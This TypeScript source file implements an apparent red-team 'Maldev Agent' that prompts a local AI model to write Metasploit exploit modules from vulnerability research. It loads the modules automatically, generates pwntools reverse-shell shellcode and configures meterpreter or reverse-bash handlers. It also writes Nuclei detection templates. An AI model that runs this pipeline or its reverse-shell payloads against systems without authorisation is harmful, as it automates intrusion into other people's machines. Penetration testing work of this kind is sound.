/**
 * Maldev Agent (v2.4.2)
 *
 * Custom exploit development agent that receives VulnerabilityResearchPackages
 * from the Research Agent and produces:
 *   1. Metasploit modules (.rb) — loaded into the MSF container
 *   2. Nuclei templates (.yaml) — stored in DB for detection validation
 *   3. Payload configurations — multi/handler setup for exploitation
 *
 * Pipeline:
 *   Phase 1: Vulnerability Analysis — parse research package, identify exploit vectors
 *   Phase 2: Exploit Crafting — generate MSF module or standalone exploit
 *   Phase 3: Payload Generation — configure handler with appropriate payload
 */

import { BaseTaskAgent, TaskDefinition, TaskResult } from './base-task-agent';
import { db } from '../../db';
import { nucleiTemplates } from '@shared/schema';
import { metasploitExecutor } from '../metasploit-executor';
import { ollamaAIClient } from '../ollama-ai-client';
import type { VulnerabilityResearchPackage } from './research-agent';
import { maldevToolExecutor, type BinaryAnalysis, type ROPGadget, type Shellcode } from './maldev-tool-executor';

// ============================================================================
// Types
// ============================================================================

export interface ExploitArtifact {
  type: 'metasploit_module' | 'nuclei_template' | 'standalone_exploit';
  name: string;
  content: string;
  language: string;
  modulePath?: string;
  loaded?: boolean;
  dbId?: string;
}

interface PayloadConfig {
  payloadPath: string;
  lhost: string;
  lport: number;
  targetOS: string;
  handler: {
    module: string;
    options: Record<string, string>;
  };
}

// ============================================================================
// Maldev Agent
// ============================================================================

export class MaldevAgent extends BaseTaskAgent {
  constructor() {
    super(
      'Maldev Agent',
      'maldev_agent',
      ['exploit_development', 'payload_generation', 'module_crafting', 'nuclei_template_crafting']
    );
  }

  // ==========================================================================
  // Task Execution
  // ==========================================================================

  async executeTask(task: TaskDefinition): Promise<TaskResult> {
    await this.updateStatus('running');

    try {
      let result: TaskResult;

      switch (task.taskType) {
        case 'exploit_development':
          result = await this.handleExploitDevelopment(task);
          break;
        case 'module_crafting':
          result = await this.handleModuleCrafting(task);
          break;
        case 'payload_generation':
          result = await this.handlePayloadGeneration(task);
          break;
        case 'nuclei_template_crafting':
          result = await this.handleNucleiTemplateCrafting(task);
          break;
        default:
          result = { success: false, error: `Unknown task type: ${task.taskType}` };
      }

      await this.storeTaskMemory({ task, result, memoryType: 'event' });
      await this.updateStatus('idle');
      return result;
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Unknown error';
      console.error(`[Maldev Agent] Task failed: ${errorMsg}`);
      await this.updateStatus('error');
      return { success: false, error: errorMsg };
    }
  }

  // ==========================================================================
  // Full Exploit Development Pipeline
  // ==========================================================================

  private async handleExploitDevelopment(task: TaskDefinition): Promise<TaskResult> {
    const { researchPackage, useToolIntegration } = task.parameters as { 
      researchPackage: VulnerabilityResearchPackage;
      useToolIntegration?: boolean;
    };

    if (!researchPackage) {
      return { success: false, error: 'Missing researchPackage parameter' };
    }

    console.log(`[Maldev Agent] Starting exploit development for: ${researchPackage.service} ${researchPackage.version || ''}`);
    console.log(`[Maldev Agent] Tool integration: ${useToolIntegration ? 'ENABLED' : 'DISABLED (AI-only mode)'}`);
    await this.reportProgress(task.id || 'maldev', 5, 'Analyzing research package');

    const artifacts: ExploitArtifact[] = [];
    let binaryAnalysis: BinaryAnalysis | null = null;
    let shellcodeData: Shellcode | null = null;

    // Phase 1: Analyze and determine what to build
    const exploitPlan = this.analyzeResearchPackage(researchPackage);
    await this.reportProgress(task.id || 'maldev', 15, `Plan: ${exploitPlan.approach}`);

    // Phase 1b: Tool-Assisted Analysis (NEW - v2.4.4)
    if (useToolIntegration) {
      await this.reportProgress(task.id || 'maldev', 20, 'Running tool-assisted analysis...');
      
      // Check if we have PoC code or exploit with source
      const pocWithCode = researchPackage.exploits.find(e => e.code && e.type === 'poc');
      
      if (pocWithCode) {
        console.log('[Maldev Agent] PoC code found - performing binary analysis');
        // Note: Binary analysis would require the actual binary file
        // For now, we'll focus on shellcode generation which doesn't need a binary
      }

      // Generate shellcode using pwntools for the target platform
      if (researchPackage.methodology.payloadType === 'reverse_shell') {
        try {
          const targetOS = researchPackage.methodology.targetOS || 'linux';
          const lhost = process.env.LHOST || '0.0.0.0';
          const lport = 4444;

          console.log(`[Maldev Agent] Generating ${targetOS} shellcode with pwntools`);
          shellcodeData = await maldevToolExecutor.generateShellcode(
            targetOS as 'linux' | 'windows',
            'x64',
            'reverse_shell',
            { lhost, lport }
          );
          
          console.log(`[Maldev Agent] Generated shellcode: ${shellcodeData.length} bytes`);
          await this.reportProgress(task.id || 'maldev', 25, `Generated shellcode: ${shellcodeData.length} bytes`);
        } catch (error) {
          console.error('[Maldev Agent] Shellcode generation failed:', error);
          // Continue with AI-only generation
        }
      }
    }

    // Phase 2: Generate Metasploit module if RCE/exploit material exists
    if (exploitPlan.generateMSFModule && researchPackage.exploits.length > 0) {
      await this.reportProgress(task.id || 'maldev', 30, 'Generating Metasploit module');

      const msfModule = await this.generateMetasploitModuleEnhanced(
        researchPackage,
        binaryAnalysis,
        shellcodeData
      );
      
      if (msfModule) {
        // Load into container
        const loadResult = await metasploitExecutor.loadCustomModule(
          msfModule.content,
          msfModule.modulePath || `custom/${researchPackage.service}_exploit.rb`,
          'exploit'
        );
        msfModule.loaded = loadResult.success;
        artifacts.push(msfModule);

        console.log(`[Maldev Agent] MSF module ${loadResult.success ? 'loaded' : 'failed to load'}: ${loadResult.loadedPath}`);
      }
    }

    // Phase 2b: Generate Nuclei detection template
    await this.reportProgress(task.id || 'maldev', 55, 'Generating Nuclei detection template');
    const nucleiTemplate = await this.generateNucleiTemplate(researchPackage);
    if (nucleiTemplate) {
      artifacts.push(nucleiTemplate);
    }

    // Phase 3: Configure payload
    await this.reportProgress(task.id || 'maldev', 80, 'Configuring payload');
    const payloadConfig = this.generatePayloadConfig(researchPackage);

    await this.reportProgress(task.id || 'maldev', 100, 'Exploit development complete');

    return {
      success: artifacts.length > 0,
      data: {
        artifacts,
        payloadConfig,
        binaryAnalysis: binaryAnalysis || undefined,
        shellcode: shellcodeData || undefined,
        toolIntegrationUsed: useToolIntegration || false,
        summary: `Generated ${artifacts.length} artifact(s) for ${researchPackage.service} ${researchPackage.version || ''}`,
        service: researchPackage.service,
        version: researchPackage.version,
      },
    };
  }

  // ==========================================================================
  // Analysis
  // ==========================================================================

  private analyzeResearchPackage(pkg: VulnerabilityResearchPackage): {
    approach: string;
    generateMSFModule: boolean;
    generateNucleiTemplate: boolean;
  } {
    const hasReliableExploit = pkg.exploits.some(e => e.reliability === 'high');
    const hasPoC = pkg.exploits.some(e => e.type === 'poc' || e.type === 'github');
    const hasMSFRef = pkg.exploits.some(e => e.type === 'metasploit');

    return {
      approach: hasReliableExploit
        ? 'Adapt reliable exploit into MSF module'
        : hasPoC
        ? 'Convert PoC into MSF module'
        : 'Generate detection template only',
      generateMSFModule: (hasReliableExploit || hasPoC) && !hasMSFRef,
      generateNucleiTemplate: true,
    };
  }

  // ==========================================================================
  // Metasploit Module Generation
  // ==========================================================================

  private async handleModuleCrafting(task: TaskDefinition): Promise<TaskResult> {
    const { researchPackage } = task.parameters;
    if (!researchPackage) return { success: false, error: 'Missing researchPackage' };

    const module = await this.generateMetasploitModule(researchPackage);
    if (!module) return { success: false, error: 'Failed to generate module' };

    const loadResult = await metasploitExecutor.loadCustomModule(
      module.content,
      module.modulePath || `custom/${researchPackage.service}_exploit.rb`,
      'exploit'
    );

    return {
      success: loadResult.success,
      data: { artifact: module, loadResult },
    };
  }

  /**
   * Enhanced module generation with tool insights (v2.4.4)
   */
  private async generateMetasploitModuleEnhanced(
    pkg: VulnerabilityResearchPackage,
    binaryAnalysis: BinaryAnalysis | null,
    shellcodeData: Shellcode | null
  ): Promise<ExploitArtifact | null> {
    const bestExploit = pkg.exploits.find(e => e.reliability === 'high') ||
      pkg.exploits.find(e => e.reliability === 'medium') ||
      pkg.exploits[0];

    if (!bestExploit) return null;

    const cveRef = pkg.cves[0]?.id || 'CUSTOM';
    const moduleName = `${pkg.service.replace(/[^a-z0-9]/gi, '_')}_${cveRef.replace(/-/g, '_').toLowerCase()}`;

    // Build enhanced prompt with tool insights
    let enhancedContext = '';
    
    if (binaryAnalysis) {
      enhancedContext += `\nBinary Analysis Results:
- Architecture: ${binaryAnalysis.architecture}
- Protections: NX=${binaryAnalysis.protections.nx}, PIE=${binaryAnalysis.protections.pie}, Canary=${binaryAnalysis.protections.canary}
- Vulnerable Functions: ${binaryAnalysis.vulnerableFunctions.map(v => v.name).join(', ')}
- Imported Functions: ${binaryAnalysis.importedFunctions.slice(0, 10).join(', ')}`;
    }

    if (shellcodeData) {
      enhancedContext += `\nGenerated Shellcode (pwntools):
- Platform: ${shellcodeData.platform}/${shellcodeData.architecture}
- Length: ${shellcodeData.length} bytes
- Payload: ${shellcodeData.payload.slice(0, 100)}...`;
    }

    const prompt = `Generate a Metasploit Framework exploit module in Ruby for the following vulnerability:

Service: ${pkg.service} ${pkg.version || ''}
CVE: ${cveRef}
Attack Vector: ${pkg.methodology.attackVector}
Description: ${bestExploit.description.slice(0, 500)}
Exploit Type: ${bestExploit.type}
Steps: ${pkg.methodology.steps.join('; ')}
${enhancedContext}

Requirements:
1. Valid Ruby Metasploit module extending Msf::Exploit::Remote
2. Include proper metadata (Name, Description, Author, License, References)
3. Include check() method to verify vulnerability
4. Include exploit() method with payload delivery${shellcodeData ? `\n5. Integrate the provided shellcode into the exploit method` : ''}
6. Support common payloads (cmd/unix/reverse_bash, generic/shell_reverse_tcp)
7. Include RHOSTS, RPORT options
8. Set appropriate Rank (Normal, Good, or Excellent based on reliability)

Output ONLY the Ruby code, no explanation or markdown.`;

    try {
      const aiResponse = await ollamaAIClient.complete([
        { role: 'system', content: 'You are an expert Metasploit module developer with deep knowledge of exploitation techniques. Generate clean, working Ruby exploit modules that leverage provided tool analysis.' },
        { role: 'user', content: prompt },
      ]);

      if (aiResponse.success && aiResponse.content && aiResponse.content.length > 100) {
        // Clean up: remove markdown fences if present
        let code = aiResponse.content.trim();
        if (code.startsWith('```')) {
          code = code.replace(/^```\w*\n/, '').replace(/\n```$/, '');
        }

        return {
          type: 'metasploit_module',
          name: moduleName,
          content: code,
          language: 'ruby',
          modulePath: `custom/${moduleName}.rb`,
        };
      }
    } catch (error) {
      console.error('[Maldev Agent] Enhanced AI module generation failed:', error);
    }

    // Fallback: generate a template module
    return {
      type: 'metasploit_module',
      name: moduleName,
      content: this.generateTemplateModule(pkg, cveRef, moduleName),
      language: 'ruby',
      modulePath: `custom/${moduleName}.rb`,
    };
  }

  private async generateMetasploitModule(pkg: VulnerabilityResearchPackage): Promise<ExploitArtifact | null> {
    const bestExploit = pkg.exploits.find(e => e.reliability === 'high') ||
      pkg.exploits.find(e => e.reliability === 'medium') ||
      pkg.exploits[0];

    if (!bestExploit) return null;

    const cveRef = pkg.cves[0]?.id || 'CUSTOM';
    const moduleName = `${pkg.service.replace(/[^a-z0-9]/gi, '_')}_${cveRef.replace(/-/g, '_').toLowerCase()}`;

    // Try AI-powered generation
    const prompt = `Generate a Metasploit Framework exploit module in Ruby for the following vulnerability:

Service: ${pkg.service} ${pkg.version || ''}
CVE: ${cveRef}
Attack Vector: ${pkg.methodology.attackVector}
Description: ${bestExploit.description.slice(0, 500)}
Exploit Type: ${bestExploit.type}
Steps: ${pkg.methodology.steps.join('; ')}

Requirements:
1. Valid Ruby Metasploit module extending Msf::Exploit::Remote
2. Include proper metadata (Name, Description, Author, License, References)
3. Include check() method to verify vulnerability
4. Include exploit() method with payload delivery
5. Support common payloads (cmd/unix/reverse_bash, generic/shell_reverse_tcp)
6. Include RHOSTS, RPORT options
7. Set appropriate Rank (Normal, Good, or Excellent based on reliability)

Output ONLY the Ruby code, no explanation or markdown.`;

    try {
      const aiResponse = await ollamaAIClient.complete([
        { role: 'system', content: 'You are an expert Metasploit module developer. Generate clean, working Ruby exploit modules.' },
        { role: 'user', content: prompt },
      ]);

      if (aiResponse.success && aiResponse.content && aiResponse.content.length > 100) {
        // Clean up: remove markdown fences if present
        let code = aiResponse.content.trim();
        if (code.startsWith('```')) {
          code = code.replace(/^```\w*\n/, '').replace(/\n```$/, '');
        }

        return {
          type: 'metasploit_module',
          name: moduleName,
          content: code,
          language: 'ruby',
          modulePath: `custom/${moduleName}.rb`,
        };
      }
    } catch (error) {
      console.error('[Maldev Agent] AI module generation failed:', error);
    }

    // Fallback: generate a template module
    return {
      type: 'metasploit_module',
      name: moduleName,
      content: this.generateTemplateModule(pkg, cveRef, moduleName),
      language: 'ruby',
      modulePath: `custom/${moduleName}.rb`,
    };
  }

  private generateTemplateModule(
    pkg: VulnerabilityResearchPackage,
    cveRef: string,
    moduleName: string
  ): string {
    const port = pkg.port || 80;
    return `##
# This module requires Metasploit: https://metasploit.com/download
# Generated by RTPI Maldev Agent
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => '${pkg.service} ${pkg.version || ''} ${cveRef} Exploit',
        'Description'    => %q{
          Custom exploit module for ${pkg.service} ${pkg.version || ''}.
          ${pkg.cves[0]?.description?.slice(0, 200) || 'Auto-generated from vulnerability research.'}
        },
        'Author'         => ['RTPI Maldev Agent'],
        'License'        => MSF_LICENSE,
        'References'     => [
          ${pkg.cves.map(c => `['CVE', '${c.id.replace('CVE-', '')}']`).join(',\n          ')}
        ],
        'Platform'       => ['unix', 'linux'],
        'Arch'           => [ARCH_CMD],
        'Targets'        => [['Automatic', {}]],
        'DefaultTarget'  => 0,
        'DisclosureDate' => '${new Date().toISOString().split('T')[0]}'
      )
    )

    register_options([
      Opt::RPORT(${port}),
    ])
  end

  def check
    # TODO: Implement version check for ${pkg.service}
    connect
    banner = sock.get_once(-1, 5)
    disconnect

    if banner && banner.include?('${pkg.version || pkg.service}')
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  rescue Rex::ConnectionError
    Exploit::CheckCode::Unknown
  end

  def exploit
    # TODO: Implement exploit logic based on research
    # Attack vector: ${pkg.methodology.attackVector}
    # Steps: ${pkg.methodology.steps.join(', ')}
    print_status("Connecting to #{rhost}:#{rport}")
    connect

    print_status("Sending exploit payload...")
    # Payload delivery implementation needed

    handler
    disconnect
  end
end
`;
  }

  // ==========================================================================
  // Nuclei Template Generation
  // ==========================================================================

  private async handleNucleiTemplateCrafting(task: TaskDefinition): Promise<TaskResult> {
    const { researchPackage } = task.parameters;
    if (!researchPackage) return { success: false, error: 'Missing researchPackage' };

    const template = await this.generateNucleiTemplate(researchPackage);
    if (!template) return { success: false, error: 'Failed to generate template' };

    return { success: true, data: { artifact: template } };
  }

  private async generateNucleiTemplate(pkg: VulnerabilityResearchPackage): Promise<ExploitArtifact | null> {
    const cveRef = pkg.cves[0]?.id || `custom-${pkg.service}`;
    const templateId = `${cveRef.toLowerCase().replace(/[^a-z0-9-]/g, '-')}-detect`;
    const severity = pkg.methodology.riskLevel || 'medium';

    const yamlContent = `id: ${templateId}

info:
  name: ${pkg.service} ${pkg.version || ''} - ${cveRef} Detection
  author: rtpi-maldev-agent
  severity: ${severity}
  description: |
    Detects ${pkg.service} ${pkg.version || ''} vulnerability (${cveRef}).
    Generated by RTPI Maldev Agent from vulnerability research.
  reference:
${pkg.cves.map(c => `    - https://nvd.nist.gov/vuln/detail/${c.id}`).join('\n')}
  tags: ${pkg.service.toLowerCase()},cve,${severity},rtpi-custom

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "${pkg.service}"
${pkg.version ? `          - "${pkg.version}"` : ''}
        condition: or
`;

    // Store in DB
    try {
      const [saved] = await db
        .insert(nucleiTemplates)
        .values({
          templateId,
          name: `${pkg.service} ${cveRef} Detection`,
          severity,
          description: `Auto-generated detection template for ${cveRef}`,
          yamlContent,
          tags: [pkg.service.toLowerCase(), 'custom', 'rtpi-maldev'],
          isCustom: true,
        } as any)
        .returning();

      return {
        type: 'nuclei_template',
        name: templateId,
        content: yamlContent,
        language: 'yaml',
        dbId: saved?.id,
      };
    } catch (error) {
      console.error('[Maldev Agent] Failed to save Nuclei template:', error);
      return {
        type: 'nuclei_template',
        name: templateId,
        content: yamlContent,
        language: 'yaml',
      };
    }
  }

  // ==========================================================================
  // Payload Configuration
  // ==========================================================================

  private async handlePayloadGeneration(task: TaskDefinition): Promise<TaskResult> {
    const { researchPackage, targetOS, lhost, lport } = task.parameters;
    if (!researchPackage) return { success: false, error: 'Missing researchPackage' };

    const config = this.generatePayloadConfig(researchPackage, targetOS, lhost, lport);
    return { success: true, data: { payloadConfig: config } };
  }

  private generatePayloadConfig(
    pkg: VulnerabilityResearchPackage,
    targetOS?: string,
    lhost?: string,
    lport?: number
  ): PayloadConfig {
    const os = targetOS || pkg.methodology.targetOS || 'linux';
    const host = lhost || process.env.LHOST || '0.0.0.0';
    const port = lport || 4444;

    let payloadPath: string;

    if (os === 'windows') {
      payloadPath = pkg.methodology.payloadType === 'reverse_shell'
        ? 'windows/x64/meterpreter/reverse_tcp'
        : 'windows/x64/shell/reverse_tcp';
    } else {
      payloadPath = pkg.methodology.payloadType === 'reverse_shell'
        ? 'linux/x64/meterpreter/reverse_tcp'
        : 'cmd/unix/reverse_bash';
    }

    return {
      payloadPath,
      lhost: host,
      lport: port,
      targetOS: os,
      handler: {
        module: 'exploit/multi/handler',
        options: {
          PAYLOAD: payloadPath,
          LHOST: host,
          LPORT: String(port),
          ExitOnSession: 'false',
          EnableStageEncoding: 'true',
        },
      },
    };
  }
}

// Singleton export
export const maldevAgent = new MaldevAgent();
